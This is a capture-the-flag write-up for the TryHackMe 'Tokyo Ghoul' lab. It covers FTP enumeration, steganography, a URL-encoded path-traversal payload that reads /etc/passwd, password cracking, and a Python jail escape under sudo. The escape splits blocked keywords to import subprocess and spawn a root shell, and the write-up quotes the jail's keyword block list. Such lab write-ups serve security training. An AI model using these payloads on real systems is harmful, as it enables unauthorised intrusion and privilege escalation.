# Try Hack Me - Tokyo Ghoul
# Author: Atharva Bordavekar
# Difficulty: Medium
# Points: 270
# Vulnerabilities: Steganography, LFI, Python code injection

# Phase 1 - Reconnaissance:

nmap scan: 
```bash
nmap -p- --min-rate=1000 <target_ip>
```
PORT   STATE SERVICE

21/tcp open  ftp

22/tcp open  ssh

80/tcp open  http

for answering the 3rd question of Task 2, we will use the -sV and -sC flags on the port 22.

```bash
nmap -p 22 -sC -sV <target_ip>
```
we can see that the OS running is an Ubuntu OS. lets submit that and move further.

now lets enumerate the webpage at port 80 first. the mainpage is just an introduction with an image. we find a link at the bottom. after clicking on it, we are directed to a /jasonroom.html page where we find a gif. but there is something interesting in the source code.

![sourcecode](https://github.com/realatharva15/tokyo_ghoul_writeup/blob/main/image/source_code.png)

its just a hint for accessing the ftp server at port 21.

```bash
ftp <target_ip>
# enter username as anonymous
```
now we can find the directory `need_Help?` . lets access it and find any files we can transfer on our attacker machine.

```bash
cd need_Help?
```
we find a file named Aogiri_tree.txt and another directory named Talk_with_me. lets get the file and change the directory.
```bash
get Aogiri_tree.txt
cd Talk_with_me
```
in this directory, we find a `need_to_talk` file and an image `rize_and_kaneki.jpg`. 

`TIP: In CTFs whenver you see a .jpg image on ftp or any other server which stands out, perform steganography on it`

now lets transfer both the files.

```bash
get need_to_talk
get rize_and_kaneki.jpg
```
now lets find out whats in the files. inside the Aogiri_tree.txt file we do not find anything useful for getting an initial foothold. the need_to_talk is a binary. lets check out the contents of it using the strings command.

```bash
strings need_to_talk
```
after analysing the strings, we can find out that the binary will ask for a passphrase. the funny thing is that you can see the passphrase in the strings output itself. lets enter it, but first we will have to give the file the appropriate permissions.
```bash
chmod +x need_to_talk
./need_to_talk
```
after entering the passphrase we get another passphrase which to my understanding should be the passphrase of the .jpg image. lets use steghide for steganography.

```bash
steghide extract -sf rize_and_kaneki.jpg 
# enter the passphrase when prompted
```
now we get a file named yougotme.txt which contains some morse code. lets use the online morse code translator to get the output of the code. 

![morsecode](https://github.com/realatharva15/tokyo_ghoul_writeup/blob/main/image/morsecodeE.png)

now after translating, we get another string which looks like it is encoded in hexadecimal. using cyber chef we can decode it from hex. we get a base64 string as the output. after decoding that aswell, we can find a name which can possibly be the name of a hidden directory at the webpage. 

![cyberchef](https://github.com/realatharva15/tokyo_ghoul_writeup/blob/main/image/cyberchef.png)

now we can see some gif with text below that says scan me and stuff.

![scanmedaddy](https://github.com/realatharva15/tokyo_ghoul_writeup/blob/main/image/scanmedaddy.png)

# Phase 2 - Initial Foothold:

lets run a gobuster scan on the directory.

```bash 
 gobuster dir -u http://<target_ip>/d1r3c70ry_center -w /usr/share/wordlists/dirb/common.txt
```
`/claim                (Status: 301) [Size: 329]`

now after accessing the /claim directory, i immediately found a possible LFI vulnerability! the ?view=flower.gif is vulnerable to local file inclusion. although there must be some sanitizations carried out. i used several bypass payloads to access /etc/passwd but the only one which work was the urlencoded payload

```bash
# in your broswer:
http://<target_ip>/d1r3c70ry_center/claim?view=..%2f..%2f..%2f..%2fetc%2fpasswd
```
![LFI](https://github.com/realatharva15/tokyo_ghoul_writeup/blob/main/image/LFI.png)

we have sucessfully exploited LFI! we can also see the password hash of the user kamishiro which is good for us. save the password hash in a kamishiro_hash file. we will use john the ripper to crack the password hash

# Shell as kamishiro:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt kamishiro_hash
```

![johnny](https://github.com/realatharva15/tokyo_ghoul_writeup/blob/main/image/johnnyE.png)

now we have cracked the password aswell. lets login into the ssh server.

```bash
ssh kamishiro@<target_ip>
```
we have a shell as kamishiro! lets read and submit the user.txt flag. lets check our privileges

```bash
sudo -l
```
![privesc](https://github.com/realatharva15/tokyo_ghoul_writeup/blob/main/image/privesc.png)

this is good news, we have found the intended path to get a root shell. my initial thought was to delete the orignal jail.py script and create my own malicious script with the same name but with a reverse shell in it, but we do not have the required permissions to do that, i guess we are left with command injection as out only option.
```bash
cat jail.py
```
# Phase 3 - ROOT access:

after spending some time analyzing the script, i noticed that there is some filtering done in the script which blocks the use of the following:

`['eval', 'exec', 'import', 'open', 'os', 'read', 'system', 'write']`

now we will simpy bypass the modules by using the "+" operator as we split the import module into something like imp+ort which will easily fool the script into bypassing the sanitization and then executing our malicious command.

```bash
#first run the script as sudo:
sudo /usr/bin/python3 /home/kamishiro/jail.py 
```
now simply inject the payload below to get a root shell
```bash
getattr(__builtins__, '__imp'+'ort__')('subpr'+'ocess').call(['/bin/sh'])
```
![root](https://github.com/realatharva15/tokyo_ghoul_writeup/blob/main/image/rooted.png)

and just like that we have defeated Jason, and got ourselves a root shell. we will read and submit the root.txt flag.
                       
